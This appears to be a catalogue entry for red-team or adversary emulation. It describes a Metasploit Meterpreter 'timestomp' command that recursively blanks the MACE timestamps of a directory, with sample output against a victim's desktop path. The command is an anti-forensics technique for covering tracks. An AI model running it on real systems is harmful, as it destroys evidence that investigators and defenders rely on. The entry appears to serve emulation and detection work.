---
id: 9c022cb0-e78c-44bb-b598-caac556164aa
name: Metasploit Recursively Manipulate File and Directory MACE Attributes
type: command
executor: metasploit
data: timestomp $_PATH -r
output: 'meterpreter > timestomp "C:\Users\Victim\Desktop" -r

  [*] Blanking directory MACE attributes on C:\Users\Victim\Desktop'
created_at: '2020-07-09T00:11:56.265177+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# Metasploit Recursively Manipulate File and Directory MACE Attributes

```metasploit
timestomp $_PATH -r
```

## Expected Output

```
meterpreter > timestomp "C:\Users\Victim\Desktop" -r
[*] Blanking directory MACE attributes on C:\Users\Victim\Desktop
```


